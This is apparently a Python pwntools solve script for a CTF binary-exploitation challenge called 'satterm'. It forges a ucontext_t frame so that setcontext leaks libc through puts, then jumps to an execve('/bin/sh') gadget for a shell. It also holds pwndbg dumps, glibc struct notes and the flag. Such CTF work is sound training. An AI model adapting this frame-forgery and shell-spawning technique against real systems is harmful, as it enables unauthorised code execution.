#!/usr/bin/env python3

from pwn import *

exe = ELF("./satterm_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-linux-x86-64.so.2", checksec=False)

elf = context.binary = exe

gs = """
break main
b *main+347
continue
"""

# run with python3 solve.py REMOTE
if args.REMOTE:
    p = remote("sat-term.aws.jerseyctf.com", 5000)

# run with python3 solve.py GDB
elif args.GDB:
    context.terminal = ["tmux", "splitw", "-h"]
    p = gdb.debug(exe.path, gdbscript=gs)

# run with python3 solve.py
else:
    p = elf.process([exe.path][1:])


### START HERE ###

# this actually could be a fire gadget for arb read: 0x00401394. Just make sure 0x00402008 is in rsi and a pointer to "flag.txt" is in rdi
input_addr = 0x00404080

p.recvuntil(b'> ')
p.sendline(b'SETTINGS')
p.sendlineafter(b'CHANGE [Y/N]: ', b'Y')
p.sendlineafter(b'APOAPSIS: ', b'100')
p.sendlineafter(b'PERIAPSIS: ', b'100')
p.sendlineafter(b'ORBIT INCLINE: ', b'100')
p.sendlineafter(b'DOWNLINK SYNCHRONIZATION MS: ', str(0x41414141 + (input_addr << 32)).encode())
p.sendlineafter(b'SATELLITE SAFE MODE [Y/N]: ', b'N')

fp_env_offset = 0x100

"""
safe_addr = 0x404800
flag_addr = input_addr + 0x28
fopen_gadget = 0x00401394
read_ptr = 0x00402008 # points to "r"

payload = flat({
    # uc_flags / uc_link
    0x00: b'STATUS\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',  # 0x10 bytes

    # uc_stack
    0x10: p64(safe_addr), # ss_sp
    0x18: p64(0), # ss_flags - prolly not necessary
    0x20: p64(0x800), # ss_size

    # gregs from +0x28
    0x28: b'flag.txt\x00\x00\x00\x00\x00\x00\x00\x00',  # R8, R9
    0x40: p64(0) * 5, # R10-R15
    0x68: p64(flag_addr), # RDI
    0x70: p64(read_ptr), # RSI
    0x78: p64(safe_addr), # RBP
    0x80: p64(0), # RBX
    0x88: p64(0), # RDX
    0x90: p64(0), # RAX
    0x98: p64(0), # RCX
    0xa0: p64(safe_addr-0x20), # RSP
    0xa8: p64(fopen_gadget),# RIP

    # fpstate pointer - to the fp_env_offset
    0xe0: p64(input_addr + fp_env_offset),

    # just enough to not segfault
    fp_env_offset: p32(0x037f) + b'\x00' * 24, # this is dereferenced to reset the fp state...
})
# I need to set up a valid setcontext frame in the buffer after I send STATUS
# Note: this is when I started manually seting the fpstate, but that can be null
#   I just didn't realize that flat() auto-filled with cyclic, which ofc breaks that
"""

new_stack = input_addr + 0x200

# new thing needs to be ret2plt and then ret2system
payload = flat({
    # uc_flags / uc_link
    0x00: b'STATUS\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',  # 0x10 bytes

    # uc_stack
    0x10: p64(new_stack), # ss_sp
    0x18: p64(0), # ss_flags - prolly not necessary
    0x20: p64(0x800), # ss_size

    # gregs from +0x28
    0x28: b'flag.txt\x00\x00\x00\x00\x00\x00\x00\x00',  # R8, R9
    0x38: p64(0) * 6, # R10-R15
    0x68: p64(elf.got['puts']), # RDI
    0x70: p64(0), # RSI
    0x78: p64(new_stack), # RBP
    0x80: p64(0), # RBX
    0x88: p64(0), # RDX
    0x90: p64(0), # RAX
    0x98: p64(0), # RCX
    0xa0: p64(new_stack-0x20), # RSP
    0xa8: p64(elf.plt['puts']),# RIP

    # fpstate pointer - to the fp_env_offset
    0xe0: p64(input_addr + fp_env_offset),

    # just enough to not segfault
    fp_env_offset: p32(0x037f) + b'\x00' * 24, # this is dereferenced to reset the fp state...
    0x1a0: p64(0x00401b46), # final ret gadget after read...

    0x1c0: p32(0x1f80), # default MXCSR

    0x1e0: p64(0x00401b46), # ret gadget back to main
    0x200: p64(0x00401b46)
},
    filler=b'\x00'
)

p.recvuntil(b'> ')
p.recvuntil(b'> ')
p.send(payload)
p.recvline()
leak = p.recv(6).ljust(8, b'\x00')
log.info(f'leaked puts address: {hex(u64(leak))}')
libc.address = u64(leak) - libc.symbols['puts']
log.info(f'libc base: {hex(libc.address)}')

payload = flat({
    # uc_flags / uc_link
    0x00: b'STATUS\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',  # 0x10 bytes

    # uc_stack
    0x10: p64(new_stack), # ss_sp
    0x18: p64(0), # ss_flags - prolly not necessary
    0x20: p64(0x800), # ss_size

    # gregs from +0x28
    0x28: b'/bin/sh' + b'\x00' * 9,  # R8, R9
    0x38: p64(0) * 6, # R10-R15
    0x68: p64(0), # RDI
    0x70: p64(0), # RSI
    0x78: p64(new_stack), # RBP
    0x80: p64(0), # RBX
    0x88: p64(0), # RDX
    0x90: p64(0), # RAX
    0x98: p64(0), # RCX
    0xa0: p64(new_stack-0x20), # RSP
    0xa8: p64(libc.address + 0xde6c3),# RIP

    # fpstate pointer - to the fp_env_offset
    0xe0: p64(input_addr + fp_env_offset),

    # just enough to not segfault
    fp_env_offset: p32(0x037f) + b'\x00' * 24, # this is dereferenced to reset the fp state...
    0x1a0: p64(0x00401bea), # final ret gadget after read...

    0x1c0: p32(0x1f80), # default MXCSR

    0x1e0: p64(0x00401b46), # ret gadget back to main
    0x200: p64(0x00401b46)
},
    filler=b'\x00',
    word_size=64
)
p.sendline(payload)

# jctf{k3rbal_sp4ce_pr0gram_but_m4ke_it_b1nex}

"""
0xde6c3 execve("/bin/sh", rbp-0x40, r13)
constraints:
  address rbp-0x38 is writable
  rdi == NULL || {"/bin/sh", rdi, NULL} is a valid argv
  [r13] == NULL || r13 == NULL || r13 is a valid envp

0xfb7a2 posix_spawn(rsp+0x64, "/bin/sh", [rsp+0x40], 0, rsp+0x70, [rsp+0xf0])
constraints:
  [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv
  [[rsp+0xf0]] == NULL || [rsp+0xf0] == NULL || [rsp+0xf0] is a valid envp
  [rsp+0x40] == NULL || (s32)[[rsp+0x40]+0x4] <= 0

0xfb7aa posix_spawn(rsp+0x64, "/bin/sh", [rsp+0x40], 0, rsp+0x70, r13)
constraints:
  [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv
  [r13] == NULL || r13 == NULL || r13 is a valid envp
  [rsp+0x40] == NULL || (s32)[[rsp+0x40]+0x4] <= 0

0xfb7af posix_spawn(rsp+0x64, "/bin/sh", rdx, 0, rsp+0x70, r13)
constraints:
  [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv
  [r13] == NULL || r13 == NULL || r13 is a valid envp
  rdx == NULL || (s32)[rdx+0x4] <= 0
"""

# 0x401b5f


# payload = flat(
#     b'STATUS' + b'\x00' * (0x10 - len('STATUS')), # clears flags and doesn't link it
#     p64(0x4040800), # should work as ss_sp
#     p64(0), p64(0x800), # ss_flags and ss_size
#     b'flag.txt' + b'\x00' * 8, # this can kill r8/9, then we can point to base+0x28 after for flag.txt string
#     p64(0) * 6, # r10-r15
#     p64(flag_addr), # rdi
#     p64(read_ptr), # rsi
#     p64(0x4040800), # rbp, just needs to be a valid pointer in the buffer
#     p64(0) * 4, # rbx, rdx, rax, rcx
#     p64(0x4040800), # rsp, just needs to be a valid pointer in the buffer
#     p64(fopen_gadget), # rip
# )

# so the gimmick is we can change the context ptr to whatever we want it to be, which will let us forge one in the input variable to use later
"""
So the structure actually looks like:
typedef struct ucontext_t {
    unsigned long uc_flags;          // +0x00
    struct ucontext_t *uc_link;      // +0x08  — context to resume when this one returns
    stack_t uc_stack;                // +0x10  — {ss_sp, ss_flags, ss_size}
    mcontext_t uc_mcontext;          // +0x28  — saved registers
    sigset_t uc_sigmask;             // ...
    // ...
} ucontext_t;

Then the stack_t structure is:
typedef struct {
    void  *ss_sp;    // +0x10 — stack base pointer
    int    ss_flags; // +0x18
    size_t ss_size;  // +0x20
} stack_t;

And the mcontext_t structure is:
enum
{
  REG_GS = 0,
  REG_FS,
  REG_ES,
  REG_DS,
  REG_EDI,
  REG_ESI,
  REG_EBP,
  REG_ESP,
  REG_EBX,
  REG_EDX,
  REG_ECX,
  REG_EAX,
  REG_TRAPNO,
  REG_ERR,
  REG_EIP,
  REG_CS,
  REG_EFL,
  REG_UESP,
  REG_SS
}


pwndbg> x/10gx 0x000000003a9e5010
0x3a9e5010:     0x0000000000000000      0x0000000000000000
0x3a9e5020:     0x000000003a9e5b70      0x0000000000000000
0x3a9e5030:     0x0000000000001000      0x0000000000021001
0x3a9e5040:     0x000000003aa06000      0x0000000000000000
0x3a9e5050:     0x0000000000000000      0x0000000000000000
pwndbg> 
0x3a9e5060:     0x00007fffd5dee338      0x00007f56fcecd000
0x3a9e5070:     0x0000000000403d18      0x000000003a9e5010
0x3a9e5080:     0x0000000000000b58      0x00007fffd5dee1f0
0x3a9e5090:     0x000000003a9e6b60      0x000000003a9e5010
0x3a9e50a0:     0x0000000000000000      0x000000003a9e5010
pwndbg> 
0x3a9e50b0:     0x000000003a9e6b58      0x000000000040135a
0x3a9e50c0:     0x0000000000000000      0x0000000000000000
0x3a9e50d0:     0x0000000000000000      0x0000000000000000
0x3a9e50e0:     0x0000000000000000      0x0000000000000000
0x3a9e50f0:     0x000000003a9e51b8      0x0000000000000000
pwndbg> 
0x3a9e5100:     0x0000000000000000      0x0000000000000000
0x3a9e5110:     0x0000000000000000      0x0000000000000000
0x3a9e5120:     0x0000000000000000      0x0000000000000000
0x3a9e5130:     0x0000000000000000      0x0000000000000000
0x3a9e5140:     0x0000000000000000      0x0000000000000000
pwndbg> 
0x3a9e5150:     0x0000000000000000      0x0000000000000000
0x3a9e5160:     0x0000000000000000      0x0000000000000000
0x3a9e5170:     0x0000000000000000      0x0000000000000000
0x3a9e5180:     0x0000000000000000      0x0000000000000000
0x3a9e5190:     0x0000000000000000      0x0000000000000000
pwndbg> 
0x3a9e51a0:     0x0000000000000000      0x0000000000000000
0x3a9e51b0:     0x0000000000000000      0xffff0000ffff037f
0x3a9e51c0:     0x00000000ffffffff      0x0000000000000000
0x3a9e51d0:     0x0000000000001f80      0x0000000000000000
0x3a9e51e0:     0x0000000000000000      0x0000000000000000
pwndbg> 
0x3a9e51f0:     0x0000000000000000      0x0000000000000000
0x3a9e5200:     0x0000000000000000      0x0000000000000000
0x3a9e5210:     0x0000000000000000      0x0000000000000000
0x3a9e5220:     0x0000000000000000      0x0000000000000000
0x3a9e5230:     0x0000000000000000      0x0000000000000000



typedef struct ucontext_t
  {
    unsigned long int __ctx(uc_flags);
    struct ucontext_t *uc_link;
    stack_t uc_stack;
    mcontext_t uc_mcontext;
    sigset_t uc_sigmask;
    struct _libc_fpstate __fpregs_mem;
    __extension__ unsigned long long int __ssp[4];
  } ucontext_t;

typedef struct
  {
    void *ss_sp;
    size_t ss_size;
    int ss_flags;
  } stack_t;

__extension__ typedef long long int greg_t;
typedef greg_t gregset_t[__NGREG];

typedef struct
  {
    gregset_t __ctx(gregs);
    /* Note that fpregs is a pointer.  */
    fpregset_t __ctx(fpregs);
    __extension__ unsigned long long __reserved1 [8];
} mcontext_t;

struct _libc_fpstate
{
  /* 64-bit FXSAVE format.  */
  __uint16_t		__ctx(cwd);
  __uint16_t		__ctx(swd);
  __uint16_t		__ctx(ftw);
  __uint16_t		__ctx(fop);
  __uint64_t		__ctx(rip);
  __uint64_t		__ctx(rdp);
  __uint32_t		__ctx(mxcsr);
  __uint32_t		__ctx(mxcr_mask);
  struct _libc_fpxreg	_st[8];
  struct _libc_xmmreg	_xmm[16];
  __uint32_t		__glibc_reserved1[24];
};

/* Structure to describe FPU registers.  */
typedef struct _libc_fpstate *fpregset_t;

  
"""

# length of one is 0x3c8

p.interactive()
